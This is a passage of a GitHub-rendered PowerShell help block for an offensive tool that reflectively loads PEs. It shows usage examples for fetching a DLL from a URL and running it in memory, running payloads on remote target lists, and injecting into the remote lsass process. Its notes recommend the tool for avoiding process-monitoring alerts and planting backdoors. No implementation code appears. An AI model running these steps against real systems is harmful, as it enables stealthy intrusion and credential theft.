          <td id="LC48" class="blob-code blob-code-inner js-file-line"><span class="pl-c">A URL containing a DLL/EXE to load and execute.</span></td>
        </tr>
        <tr>
          <td id="L49" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="49"></td>
          <td id="LC49" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L50" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="50"></td>
          <td id="LC50" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c"><span class="pl-c1">.</span><span class="pl-k">PARAMETER</span> <span class="pl-k">PEBytes</span></span></span></td>
        </tr>
        <tr>
          <td id="L51" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="51"></td>
          <td id="LC51" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L52" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="52"></td>
          <td id="LC52" class="blob-code blob-code-inner js-file-line"><span class="pl-c">A byte array containing a DLL/EXE to load and execute.</span></td>
        </tr>
        <tr>
          <td id="L53" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="53"></td>
          <td id="LC53" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L54" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="54"></td>
          <td id="LC54" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c"><span class="pl-c1">.</span><span class="pl-k">PARAMETER</span> <span class="pl-k">ComputerName</span></span></span></td>
        </tr>
        <tr>
          <td id="L55" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="55"></td>
          <td id="LC55" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L56" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="56"></td>
          <td id="LC56" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Optional, an array of computernames to run the script on.</span></td>
        </tr>
        <tr>
          <td id="L57" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="57"></td>
          <td id="LC57" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L58" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="58"></td>
          <td id="LC58" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c"><span class="pl-c1">.</span><span class="pl-k">PARAMETER</span> <span class="pl-k">FuncReturnType</span></span></span></td>
        </tr>
        <tr>
          <td id="L59" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="59"></td>
          <td id="LC59" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L60" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="60"></td>
          <td id="LC60" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Optional, the return type of the function being called in the DLL. Default: Void</span></td>
        </tr>
        <tr>
          <td id="L61" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="61"></td>
          <td id="LC61" class="blob-code blob-code-inner js-file-line"><span class="pl-c">	Options: String, WString, Void. See notes for more information.</span></td>
        </tr>
        <tr>
          <td id="L62" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="62"></td>
          <td id="LC62" class="blob-code blob-code-inner js-file-line"><span class="pl-c">	IMPORTANT: For DLLs being loaded remotely, only Void is supported.</span></td>
        </tr>
        <tr>
          <td id="L63" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="63"></td>
          <td id="LC63" class="blob-code blob-code-inner js-file-line"><span class="pl-c">	</span></td>
        </tr>
        <tr>
          <td id="L64" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="64"></td>
          <td id="LC64" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c"><span class="pl-c1">.</span><span class="pl-k">PARAMETER</span> <span class="pl-k">ExeArgs</span></span></span></td>
        </tr>
        <tr>
          <td id="L65" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="65"></td>
          <td id="LC65" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L66" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="66"></td>
          <td id="LC66" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Optional, arguments to pass to the executable being reflectively loaded.</span></td>
        </tr>
        <tr>
          <td id="L67" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="67"></td>
          <td id="LC67" class="blob-code blob-code-inner js-file-line"><span class="pl-c">	</span></td>
        </tr>
        <tr>
          <td id="L68" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="68"></td>
          <td id="LC68" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c"><span class="pl-c1">.</span><span class="pl-k">PARAMETER</span> <span class="pl-k">ProcName</span></span></span></td>
        </tr>
        <tr>
          <td id="L69" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="69"></td>
          <td id="LC69" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L70" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="70"></td>
          <td id="LC70" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.</span></td>
        </tr>
        <tr>
          <td id="L71" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="71"></td>
          <td id="LC71" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L72" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="72"></td>
          <td id="LC72" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c"><span class="pl-c1">.</span><span class="pl-k">PARAMETER</span> <span class="pl-k">ProcId</span></span></span></td>
        </tr>
        <tr>
          <td id="L73" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="73"></td>
          <td id="LC73" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L74" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="74"></td>
          <td id="LC74" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.</span></td>
        </tr>
        <tr>
          <td id="L75" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="75"></td>
          <td id="LC75" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L76" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="76"></td>
          <td id="LC76" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c"><span class="pl-c1">.</span><span class="pl-k">PARAMETER</span> <span class="pl-k">ForceASLR</span></span></span></td>
        </tr>
        <tr>
          <td id="L77" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="77"></td>
          <td id="LC77" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L78" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="78"></td>
          <td id="LC78" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn&#39;t support ASLR. Some PE&#39;s will work with ASLR even</span></td>
        </tr>
        <tr>
          <td id="L79" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="79"></td>
          <td id="LC79" class="blob-code blob-code-inner js-file-line"><span class="pl-c">    if the compiler flags don&#39;t indicate they support it. Other PE&#39;s will simply crash. Make sure to test this prior to using. Has no effect when</span></td>
        </tr>
        <tr>
          <td id="L80" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="80"></td>
          <td id="LC80" class="blob-code blob-code-inner js-file-line"><span class="pl-c">    loading in to a remote process.</span></td>
        </tr>
        <tr>
          <td id="L81" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="81"></td>
          <td id="LC81" class="blob-code blob-code-inner js-file-line"><span class="pl-c">	</span></td>
        </tr>
        <tr>
          <td id="L82" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="82"></td>
          <td id="LC82" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c"><span class="pl-c1">.</span><span class="pl-k">EXAMPLE</span></span></span></td>
        </tr>
        <tr>
          <td id="L83" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="83"></td>
          <td id="LC83" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L84" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="84"></td>
          <td id="LC84" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Load DemoDLL from a URL and run the exported function WStringFunc on the current system, print the wchar_t* returned by WStringFunc().</span></td>
        </tr>
        <tr>
          <td id="L85" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="85"></td>
          <td id="LC85" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Note that the file name on the website can be any file extension.</span></td>
        </tr>
        <tr>
          <td id="L86" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="86"></td>
          <td id="LC86" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Invoke-ReflectivePEInjection -PEUrl http://yoursite.com/DemoDLL.dll -FuncReturnType WString</span></td>
        </tr>
        <tr>
          <td id="L87" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="87"></td>
          <td id="LC87" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L88" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="88"></td>
          <td id="LC88" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c"><span class="pl-c1">.</span><span class="pl-k">EXAMPLE</span></span></span></td>
        </tr>
        <tr>
          <td id="L89" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="89"></td>
          <td id="LC89" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L90" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="90"></td>
          <td id="LC90" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().</span></td>
        </tr>
        <tr>
          <td id="L91" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="91"></td>
          <td id="LC91" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName Target.local</span></td>
        </tr>
        <tr>
          <td id="L92" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="92"></td>
          <td id="LC92" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L93" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="93"></td>
          <td id="LC93" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c"><span class="pl-c1">.</span><span class="pl-k">EXAMPLE</span></span></span></td>
        </tr>
        <tr>
          <td id="L94" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="94"></td>
          <td id="LC94" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L95" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="95"></td>
          <td id="LC95" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print</span></td>
        </tr>
        <tr>
          <td id="L96" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="96"></td>
          <td id="LC96" class="blob-code blob-code-inner js-file-line"><span class="pl-c">	the wchar_t* returned by WStringFunc() from all the computers.</span></td>
        </tr>
        <tr>
          <td id="L97" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="97"></td>
          <td id="LC97" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Invoke-ReflectivePEInjection -PEPath DemoDLL.dll -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)</span></td>
        </tr>
        <tr>
          <td id="L98" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="98"></td>
          <td id="LC98" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L99" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="99"></td>
          <td id="LC99" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c"><span class="pl-c1">.</span><span class="pl-k">EXAMPLE</span></span></span></td>
        </tr>
        <tr>
          <td id="L100" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="100"></td>
          <td id="LC100" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L101" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="101"></td>
          <td id="LC101" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Load DemoEXE and run it locally.</span></td>
        </tr>
        <tr>
          <td id="L102" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="102"></td>
          <td id="LC102" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Invoke-ReflectivePEInjection -PEPath DemoEXE.exe -ExeArgs &quot;Arg1 Arg2 Arg3 Arg4&quot;</span></td>
        </tr>
        <tr>
          <td id="L103" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="103"></td>
          <td id="LC103" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L104" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="104"></td>
          <td id="LC104" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c"><span class="pl-c1">.</span><span class="pl-k">EXAMPLE</span></span></span></td>
        </tr>
        <tr>
          <td id="L105" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="105"></td>
          <td id="LC105" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L106" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="106"></td>
          <td id="LC106" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Load DemoEXE and run it locally. Forces ASLR on for the EXE.</span></td>
        </tr>
        <tr>
          <td id="L107" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="107"></td>
          <td id="LC107" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Invoke-ReflectivePEInjection -PEPath DemoEXE.exe -ExeArgs &quot;Arg1 Arg2 Arg3 Arg4&quot; -ForceASLR</span></td>
        </tr>
        <tr>
          <td id="L108" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="108"></td>
          <td id="LC108" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L109" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="109"></td>
          <td id="LC109" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c"><span class="pl-c1">.</span><span class="pl-k">EXAMPLE</span></span></span></td>
        </tr>
        <tr>
          <td id="L110" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="110"></td>
          <td id="LC110" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L111" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="111"></td>
          <td id="LC111" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.</span></td>
        </tr>
        <tr>
          <td id="L112" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="112"></td>
          <td id="LC112" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Invoke-ReflectivePEInjection -PEPath DemoDLL_RemoteProcess.dll -ProcName lsass -ComputerName Target.Local</span></td>
        </tr>
        <tr>
          <td id="L113" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="113"></td>
          <td id="LC113" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L114" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="114"></td>
          <td id="LC114" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c"><span class="pl-c1">.</span><span class="pl-k">EXAMPLE</span></span></span></td>
        </tr>
        <tr>
          <td id="L115" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="115"></td>
          <td id="LC115" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L116" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="116"></td>
          <td id="LC116" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Load a PE from a byte array.</span></td>
        </tr>
        <tr>
          <td id="L117" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="117"></td>
          <td id="LC117" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Invoke-ReflectivePEInjection -PEPath (Get-Content c:\DemoEXE.exe -Encoding Byte) -ExeArgs &quot;Arg1 Arg2 Arg3 Arg4&quot;</span></td>
        </tr>
        <tr>
          <td id="L118" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="118"></td>
          <td id="LC118" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L119" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="119"></td>
          <td id="LC119" class="blob-code blob-code-inner js-file-line"><span class="pl-c"><span class="pl-c"><span class="pl-c1">.</span><span class="pl-k">NOTES</span></span></span></td>
        </tr>
        <tr>
          <td id="L120" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="120"></td>
          <td id="LC120" class="blob-code blob-code-inner js-file-line"><span class="pl-c">GENERAL NOTES:</span></td>
        </tr>
        <tr>
          <td id="L121" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="121"></td>
          <td id="LC121" class="blob-code blob-code-inner js-file-line"><span class="pl-c">The script has 3 basic sets of functionality:</span></td>
        </tr>
        <tr>
          <td id="L122" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="122"></td>
          <td id="LC122" class="blob-code blob-code-inner js-file-line"><span class="pl-c">1.) Reflectively load a DLL in to the PowerShell process</span></td>
        </tr>
        <tr>
          <td id="L123" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="123"></td>
          <td id="LC123" class="blob-code blob-code-inner js-file-line"><span class="pl-c">	-Can return DLL output to user when run remotely or locally.</span></td>
        </tr>
        <tr>
          <td id="L124" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="124"></td>
          <td id="LC124" class="blob-code blob-code-inner js-file-line"><span class="pl-c">	-Cleans up memory in the PS process once the DLL finishes executing.</span></td>
        </tr>
        <tr>
          <td id="L125" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="125"></td>
          <td id="LC125" class="blob-code blob-code-inner js-file-line"><span class="pl-c">	-Great for running pentest tools on remote computers without triggering process monitoring alerts.</span></td>
        </tr>
        <tr>
          <td id="L126" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="126"></td>
          <td id="LC126" class="blob-code blob-code-inner js-file-line"><span class="pl-c">	-By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.</span></td>
        </tr>
        <tr>
          <td id="L127" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="127"></td>
          <td id="LC127" class="blob-code blob-code-inner js-file-line"><span class="pl-c">2.) Reflectively load an EXE in to the PowerShell process.</span></td>
        </tr>
        <tr>
          <td id="L128" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="128"></td>
          <td id="LC128" class="blob-code blob-code-inner js-file-line"><span class="pl-c">	-Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.</span></td>
        </tr>
        <tr>
          <td id="L129" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="129"></td>
          <td id="LC129" class="blob-code blob-code-inner js-file-line"><span class="pl-c">	-Cleans up memory in the PS process once the DLL finishes executing.</span></td>
        </tr>
        <tr>
          <td id="L130" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="130"></td>
          <td id="LC130" class="blob-code blob-code-inner js-file-line"><span class="pl-c">	-Great for running existing pentest tools which are EXE&#39;s without triggering process monitoring alerts.</span></td>
        </tr>
        <tr>
          <td id="L131" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="131"></td>
          <td id="LC131" class="blob-code blob-code-inner js-file-line"><span class="pl-c">3.) Reflectively inject a DLL in to a remote process.</span></td>
        </tr>
        <tr>
          <td id="L132" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="132"></td>
          <td id="LC132" class="blob-code blob-code-inner js-file-line"><span class="pl-c">	-Can NOT return DLL output to the user when run remotely OR locally.</span></td>
        </tr>
        <tr>
          <td id="L133" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="133"></td>
          <td id="LC133" class="blob-code blob-code-inner js-file-line"><span class="pl-c">	-Does NOT clean up memory in the remote process if/when DLL finishes execution.</span></td>
        </tr>
        <tr>
          <td id="L134" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="134"></td>
          <td id="LC134" class="blob-code blob-code-inner js-file-line"><span class="pl-c">	-Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.</span></td>
        </tr>
        <tr>
          <td id="L135" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="135"></td>
          <td id="LC135" class="blob-code blob-code-inner js-file-line"><span class="pl-c">	-Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.</span></td>
        </tr>
        <tr>
          <td id="L136" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="136"></td>
          <td id="LC136" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L137" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="137"></td>
          <td id="LC137" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L138" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="138"></td>
          <td id="LC138" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L139" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="139"></td>
          <td id="LC139" class="blob-code blob-code-inner js-file-line"><span class="pl-c">DLL LOADING NOTES:</span></td>
        </tr>
        <tr>
          <td id="L140" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="140"></td>
          <td id="LC140" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L141" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="141"></td>
          <td id="LC141" class="blob-code blob-code-inner js-file-line"><span class="pl-c">PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.</span></td>
        </tr>
        <tr>
          <td id="L142" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="142"></td>
          <td id="LC142" class="blob-code blob-code-inner js-file-line"><span class="pl-c">If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL</span></td>
        </tr>
        <tr>
          <td id="L143" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="143"></td>
          <td id="LC143" class="blob-code blob-code-inner js-file-line"><span class="pl-c">return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell</span></td>
        </tr>
        <tr>
          <td id="L144" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="144"></td>
          <td id="LC144" class="blob-code blob-code-inner js-file-line"><span class="pl-c">remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from</span></td>
        </tr>
        <tr>
          <td id="L145" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="145"></td>
          <td id="LC145" class="blob-code blob-code-inner js-file-line"><span class="pl-c">applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.</span></td>
        </tr>
        <tr>
          <td id="L146" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="146"></td>
          <td id="LC146" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L147" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="147"></td>
          <td id="LC147" class="blob-code blob-code-inner js-file-line"><span class="pl-c">For DLL Loading:</span></td>
        </tr>
        <tr>
          <td id="L148" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="148"></td>
          <td id="LC148" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Once this script loads the DLL, it calls a function in the DLL. There is a section near the bottom labeled &quot;YOUR CODE GOES HERE&quot;</span></td>
        </tr>
        <tr>
          <td id="L149" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="149"></td>
          <td id="LC149" class="blob-code blob-code-inner js-file-line"><span class="pl-c">I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return</span></td>
        </tr>
        <tr>
          <td id="L150" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="150"></td>
          <td id="LC150" class="blob-code blob-code-inner js-file-line"><span class="pl-c">the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the</span></td>
        </tr>
        <tr>
          <td id="L151" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="151"></td>
          <td id="LC151" class="blob-code blob-code-inner js-file-line"><span class="pl-c">returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:</span></td>
        </tr>
        <tr>
          <td id="L152" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="152"></td>
          <td id="LC152" class="blob-code blob-code-inner js-file-line"><span class="pl-c">wchar_t*   : FuncReturnType = WString</span></td>
        </tr>
        <tr>
          <td id="L153" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="153"></td>
          <td id="LC153" class="blob-code blob-code-inner js-file-line"><span class="pl-c">char*      : FuncReturnType = String</span></td>
        </tr>
        <tr>
          <td id="L154" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="154"></td>
          <td id="LC154" class="blob-code blob-code-inner js-file-line"><span class="pl-c">void       : Default, don&#39;t supply a FuncReturnType</span></td>
        </tr>
        <tr>
          <td id="L155" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="155"></td>
          <td id="LC155" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L156" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="156"></td>
          <td id="LC156" class="blob-code blob-code-inner js-file-line"><span class="pl-c">For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Don&#39;t simply convert a string</span></td>
        </tr>
        <tr>
          <td id="L157" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="157"></td>
          <td id="LC157" class="blob-code blob-code-inner js-file-line"><span class="pl-c">using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.</span></td>
        </tr>
        <tr>
          <td id="L158" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="158"></td>
          <td id="LC158" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L159" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="159"></td>
          <td id="LC159" class="blob-code blob-code-inner js-file-line"><span class="pl-c">The function name expected in the DLL for the prewritten FuncReturnType&#39;s is as follows:</span></td>
        </tr>
        <tr>
          <td id="L160" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="160"></td>
          <td id="LC160" class="blob-code blob-code-inner js-file-line"><span class="pl-c">WString    : WStringFunc</span></td>
        </tr>
        <tr>
          <td id="L161" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="161"></td>
          <td id="LC161" class="blob-code blob-code-inner js-file-line"><span class="pl-c">String     : StringFunc</span></td>
        </tr>
        <tr>
          <td id="L162" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="162"></td>
          <td id="LC162" class="blob-code blob-code-inner js-file-line"><span class="pl-c">Void       : VoidFunc</span></td>
        </tr>
        <tr>
          <td id="L163" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="163"></td>
          <td id="LC163" class="blob-code blob-code-inner js-file-line"><span class="pl-c"></span></td>
        </tr>
        <tr>
          <td id="L164" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="164"></td>
